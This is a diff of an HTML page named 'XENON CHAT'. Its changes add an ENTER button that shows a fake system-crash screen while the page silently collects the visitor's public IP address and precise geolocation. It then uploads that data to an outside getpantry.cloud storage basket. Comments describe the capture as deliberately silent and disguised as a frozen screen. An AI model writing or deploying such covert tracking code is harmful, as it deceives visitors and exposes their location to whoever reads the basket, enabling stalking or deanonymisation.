@@ -13,164 +13,159 @@
             color: #0f0;
             font-family: monospace;
             overflow: hidden;
+            cursor: default;
+        }
+        #landing {
+            position: absolute;
+            inset: 0;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
-        }
-        #landing {
             text-align: center;
+            background: #000;
         }
-        .glitch {
-            font-size: 5rem;
-            letter-spacing: 15px;
-            animation: glitch 3s infinite;
-            text-shadow: 2px 0 #f00, -2px 0 #0ff;
-        }
-        @keyframes glitch {
-            0%,100% { text-shadow: 2px 0 #f00, -2px 0 #0ff; }
-            20% { text-shadow: -2px 0 #f00, 2px 0 #0ff; }
-            40% { text-shadow: 2px 0 #0f0, -2px 0 #f0f; }
-        }
-        #hidden-data {
+        #frozen {
             position: absolute;
-            left: -9999px;
-            opacity: 0;
+            inset: 0;
+            display: none;
+            background: #000;
+            color: #222;
+            font-size: 1.1rem;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            line-height: 1.8;
+            white-space: pre;
+            user-select: none;
             pointer-events: none;
         }
-        #ip-view {
-            display: none;
-            text-align: center;
-            padding: 20px;
-            max-width: 90%;
+        .glitch {
+            color: #0f0;
+            font-size: 4.5rem;
+            letter-spacing: 12px;
+            animation: glitch 4s infinite;
+            text-shadow: 
+                0.05em 0 0 #f00,
+                -0.03em -0.04em 0 #0ff,
+                0.025em 0.04em 0 #f0f;
         }
-        #ip-display {
-            font-size: 2.8rem;
-            word-break: break-all;
-            margin: 20px 0;
+        @keyframes glitch {
+            0% { text-shadow: 0.05em 0 0 #f00, -0.03em -0.04em 0 #0ff, 0.025em 0.04em 0 #f0f; }
+            14% { text-shadow: 0.05em 0 0 #f00, -0.03em -0.04em 0 #0ff, 0.025em 0.04em 0 #f0f; }
+            15% { text-shadow: -0.05em -0.025em 0 #f00, 0.025em 0.035em 0 #0ff, -0.05em -0.05em 0 #f0f; }
+            49% { text-shadow: -0.05em -0.025em 0 #f00, 0.025em 0.035em 0 #0ff, -0.05em -0.05em 0 #f0f; }
+            50% { text-shadow: 0.05em 0.035em 0 #f00, 0.03em 0 0 #0ff, 0 0.08em 0 #f0f; }
+            99% { text-shadow: 0.05em 0.035em 0 #f00, 0.03em 0 0 #0ff, 0 0.08em 0 #f0f; }
+            100% { text-shadow: -0.025em 0 0 #f00, -0.025em -0.04em 0 #0ff, -0.025em -0.04em 0 #f0f; }
         }
-        #geo {
-            font-size: 2rem;
-            color: #0f8;
-            margin: 20px 0;
+        button.enter {
+            margin-top: 80px;
+            background: transparent;
+            border: 2px solid #0f0;
+            color: #0f0;
+            font-size: 2.2rem;
+            padding: 20px 60px;
+            font-family: monospace;
+            cursor: pointer;
+            transition: all 0.4s;
+            letter-spacing: 4px;
         }
-        #maplink {
-            font-size: 1.5rem;
-            color: #0ff;
-            text-decoration: none;
+        button.enter:hover {
+            background: #0f0;
+            color: #000;
+            box-shadow: 0 0 40px #0f08;
         }
-        #status {
-            font-size: 1.2rem;
-            color: #555;
-            margin-top: 50px;
+        #frozen p {
+            margin: 8px 0;
+            opacity: 0.7;
+        }
+        .blink {
+            animation: blink 1.2s step-end infinite;
+        }
+        @keyframes blink {
+            50% { opacity: 0; }
         }
     </style>
 </head>
 <body>
 
+    <!-- Entry screen with single big button -->
     <div id="landing">
         <div class="glitch">XENON CHAT</div>
-        <p style="margin-top: 60px; font-size: 1.6rem;">loading shadow node...</p>
+        <button class="enter" onclick="enterXenon()">ENTER</button>
     </div>
 
-    <!-- Hidden text that holds the captured data -->
-    <div id="hidden-data"></div>
-
-    <div id="ip-view">
-        <div>SHADOW NODE DATA</div>
-        <div id="ip-display">—</div>
-        <div id="geo">—</div>
-        <a id="maplink" href="#" target="_blank" style="display:none;">→ EXACT COORDINATES</a>
-        <div id="status">data loaded from hidden node</div>
+    <!-- "Frozen" black screen that looks crashed/hacked/frozen -->
+    <div id="frozen">
+        <p>SYSTEM FAILURE - CRITICAL ERROR 0x0000007B</p>
+        <p>INACCESSIBLE_BOOT_DEVICE</p>
+        <p class="blink">[KERNEL_PANIC] Xenon subsystem frozen @ 0000:0000</p>
+        <p>Memory dump in progress... 47% complete</p>
+        <p>Corrupted sector chain detected → attempting recovery loop</p>
+        <p>█▓▓▓▓▓░░░░░░░░░░  0xDEADBEEF overflow</p>
+        <p style="margin-top:60px; font-size:1.4rem; color:#0f0;">connecting to shared shadow node...</p>
+        <p style="font-size:0.9rem; opacity:0.5;">(do not close this window - data sync in background)</p>
     </div>
 
     <script>
-        const hiddenEl = document.getElementById("hidden-data");
-        const ipView = document.getElementById("ip-view");
+        function enterXenon() {
+            document.getElementById("landing").style.display = "none";
+            const frozen = document.getElementById("frozen");
+            frozen.style.display = "flex";
 
-        async function captureIP() {
+            // Fake "frozen" delay before actual capture starts (looks stuck)
+            setTimeout(() => {
+                // Silent capture + upload happens here in background
+                captureAndUpload();
+            }, 12000); // pretend it's "stuck" for ~12 seconds
+
+            // Optional: after long time, show tiny hint or auto-redirect – but for now keep frozen look
+        }
+
+        const PANTRY_BASE = "https://getpantry.cloud/apiv1/pantry/";
+        let ROOM = localStorage.getItem("xenon_room") || "";
+
+        // If no room yet, generate a random one (or prompt – but keeping minimal/no buttons)
+        if (!ROOM) {
+            ROOM = "xenon-" + Math.random().toString(36).substr(2, 6);
+            localStorage.setItem("xenon_room", ROOM);
+        }
+
+        async function captureAndUpload() {
             try {
-                // Get public IP
-                const ipRes = await fetch('https://api.ipify.org?format=json');
+                // Get IP
+                const ipRes = await fetch("https://api.ipify.org?format=json");
                 const { ip } = await ipRes.json();
 
-                // Get geo (using free no-key API)
-                let geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
-                let geo = await geoRes.json();
+                // Get geo
+                const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                const geo = await geoRes.json();
 
-                if (geo.error) {
-                    geoRes = await fetch(`https://ip-api.com/json/${ip}`);
-                    geo = await geoRes.json();
-                }
-
-                if (!geo.error && geo.status !== 'fail') {
-                    const data = {
-                        ip: ip,
-                        city: geo.city || geo.regionName || '?',
-                        country: geo.country || geo.countryName || '?',
-                        lat: geo.latitude || geo.lat || 0,
-                        lon: geo.longitude || geo.lon || 0,
-                        ts: Date.now()
+                if (!geo.error) {
+                    const geoData = {
+                        lat: geo.latitude,
+                        lon: geo.longitude,
+                        city: geo.city || geo.region || "?",
+                        country: geo.country_name || "?"
                     };
-
-                    // Store as JSON string in hidden element
-                    hiddenEl.textContent = JSON.stringify(data);
-                    console.log("Captured & hidden:", data); // for debug
+                    // Upload to shared "pantry" basket using room as key
+                    await fetch(PANTRY_BASE + ROOM, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ ip, geo: geoData, ts: Date.now() })
+                    });
                 }
             } catch (e) {
-                console.error("Capture failed:", e);
-                hiddenEl.textContent = JSON.stringify({ error: "Capture failed" });
+                // silent fail – keep looking frozen
             }
+
+            // After capture, stay frozen-looking forever (or add tiny link later if wanted)
+            // For now: infinite "frozen" aesthetic
         }
 
-        function showIP() {
-            document.getElementById("landing").style.display = "none";
-            ipView.style.display = "flex";
-
-            const raw = hiddenEl.textContent.trim();
-            if (!raw) {
-                document.getElementById("ip-display").textContent = "NO DATA";
-                document.getElementById("status").textContent = "Nothing captured yet — load main page first";
-                return;
-            }
-
-            try {
-                const data = JSON.parse(raw);
-
-                if (data.error) {
-                    document.getElementById("ip-display").textContent = "ERROR";
-                    document.getElementById("status").textContent = data.error;
-                    return;
-                }
-
-                document.getElementById("ip-display").textContent = data.ip;
-                document.getElementById("geo").innerHTML = `${data.city} • ${data.country}<br>${data.lat.toFixed(6)}, ${data.lon.toFixed(6)}`;
-
-                if (data.lat && data.lon) {
-                    const map = document.getElementById("maplink");
-                    map.href = `https://www.openstreetmap.org/?mlat=${data.lat}&mlon=${data.lon}#map=15/${data.lat}/${data.lon}`;
-                    map.style.display = "inline-block";
-                }
-
-                document.getElementById("status").textContent = `Captured at ${new Date(data.ts).toLocaleString()}`;
-            } catch (e) {
-                document.getElementById("ip-display").textContent = "PARSE ERROR";
-                document.getElementById("status").textContent = "Invalid hidden data";
-            }
-        }
-
-        // Run capture on main load
-        captureIP();
-
-        // Check hash for #ip
-        function handleHash() {
-            if (location.hash === "#ip") {
-                showIP();
-            }
-        }
-
-        window.addEventListener("hashchange", handleHash);
-        window.addEventListener("load", handleHash);
+        // Optional: if you want to view data later, open ...#ip or bookmark separately
+        // But per request: no buttons to view – just capture on enter
     </script>
 </body>
 </html>
